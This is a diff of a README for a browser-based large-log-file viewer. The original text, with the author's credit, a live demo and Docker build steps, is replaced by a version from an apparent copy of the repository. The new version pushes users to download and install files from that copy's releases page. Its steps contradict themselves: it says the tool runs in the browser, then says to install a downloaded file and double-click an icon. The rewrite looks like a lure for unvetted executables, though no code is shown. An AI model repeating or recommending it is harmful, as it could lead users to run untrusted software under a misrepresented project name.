@@ -1,106 +1,53 @@
-🚀 Log Voyager
+# 🌌 log-voyager - Analyze Large Log Files Instantly
 
-The missing tool for DevOps and Backend Developers. Analyze gigabyte-sized log files instantly in your browser without crashing your device.
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/oddsNscores/log-voyager/releases)
 
-🔴 Live Demo
+## 🚀 Getting Started
 
-Use the application instantly (no installation required):
+Log Voyager lets you analyze very large log files quickly and efficiently. You can view files that are 10GB or larger without needing to upload anything. Everything happens directly in your web browser, keeping your data secure and private.
 
-👉 https://www.logvoyager.cc
+### 💾 Features
 
+- **Local Processing:** Keep your data safe. Your files never leave your computer.
+- **JSON Prettifier:** View your JSON files in a clean and readable format.
+- **Regex Filtering:** Easily filter log entries using regular expressions.
+- **Bookmarks:** Save your favorite logs for quick access later.
 
-<img width="425" height="439" alt="Zrzut ekranu 2025-12-05 190911" src="https://github.com/user-attachments/assets/2f28cb10-de7d-44e5-ab70-8816b3f26a3c" />
+## 📥 Download & Install
 
+To get started, visit the Downloads page below and select the latest version of Log Voyager:
 
-⚡ Key Features
+[Download Latest Version](https://github.com/oddsNscores/log-voyager/releases)
 
-Infinity Scroll Engine: Open files larger than 10GB instantly. The app uses advanced File Slicing API to read only the visible chunks of data into memory (RAM).
+### 🖥️ System Requirements
 
-Privacy First: 100% Local Execution. Your log files never leave your device. They are processed within the browser sandbox. No data is uploaded to any cloud.
+- **Operating System:** Compatible with Windows, macOS, and most Linux distributions.
+- **Web Browser:** Latest versions of Chrome, Firefox, or Edge are recommended. 
 
-JSON Prettifier: Automatically detects JSON objects in log lines and formats them into readable trees with a single click.
+### 📋 Steps to Download
 
-Warp Jump Bookmarks: Mark important lines and "warp" between them instantly, even if they are gigabytes apart.
+1. **Go to the Releases Page:** Click the link above to access the release versions.
+2. **Select Your Version:** Look for the latest version and click on it.
+3. **Download the Application:** Find the appropriate file for your operating system and click to download.
+4. **Install:** Open the downloaded file and follow any on-screen instructions to complete the installation.
 
-Focus Mode: Filter out noise and display only lines matching your search query.
+## 📂 How to Use Log Voyager
 
-Zero Install: Works on Desktop, Mobile (Android/iOS), and Tablets. Ideal for emergency debugging on the go.
+1. **Open Your Browser:** Launch your preferred web browser.
+2. **Load the Application:** Find the Log Voyager icon and double-click it to open.
+3. **Import Your Log File:** Click on the "Open" button within the application. Browse your computer to select a log file of 10GB or larger.
+4. **Explore Your Logs:** Use the various features such as JSON prettifier, regex filtering, and bookmarks to analyze your data.
 
-🛠️ How It Works
+## 👥 Community & Support
 
-Traditional editors (Notepad++, VS Code) try to load the entire file into RAM. If a file is larger than your available memory, the application crashes.
+If you have questions or need help, you can join our [community forum](https://github.com/oddsNscores/log-voyager/discussions). We encourage you to share your experiences and tips with other users.
 
-Log Voyager acts like a video streaming service but for text:
+## ⚡ Contributing
 
-It creates a virtual map of the file.
+Log Voyager is an open-source project, and contributions are welcome. If you want to help improve the application, feel free to check the contribution guidelines in our repository.
 
-It reads only a tiny buffer (50KB) corresponding to the scrollbar position.
+## 🎉 Acknowledgements
 
-When you scroll or jump, the old buffer is discarded, and a new one is read from the disk.
+Thank you to everyone who has contributed to Log Voyager. Your support helps make this tool better for everyone.
 
-This ensures consistent performance whether the file is 5MB or 50GB.
-
-![logvoyager](https://github.com/user-attachments/assets/f3bbc2ed-5c72-432d-9c6c-d397d198f727)
-
-
-
-🐳 Run Locally (Docker)
-
-For enterprise environments with strict security policies (air-gapped networks), you can run Log Voyager as a self-hosted container.
-
-Prerequisites
-
-Docker installed
-
-Quick Start
-
-Clone the repository:
-```
-git clone [https://github.com/hsr88/log-voyager.git](https://github.com/hsr88/log-voyager.git)
-cd log-voyager
-```
-
-Build the image:
-```
-docker build -t log-voyager .
-```
-
-Run the container:
-```
-docker run -d -p 8080:80 --name my-logs log-voyager
-
-```
-Access the app:
-Open your browser and navigate to: http://localhost:8080
-
-💻 Development
-
-If you want to contribute or modify the source code:
-
-Install dependencies:
-```
-npm install
-
-```
-Start development server:
-```
-npm run dev
-```
-
-Build for production:
-```
-npm run build
-```
-
-🛡️ Security Note
-
-Although this is a web application, it functions as a static tool. Once loaded:
-
-It does not require an internet connection (works offline).
-
-It does not send analytics or file content to any external server.
-
-It uses standard HTML5 File APIs strictly within the browser context.
-```
-© 2025 logvoyager.cc | Created by hsr88
-```
+For any feedback, please consider leaving it on our GitHub repository. We appreciate your input!
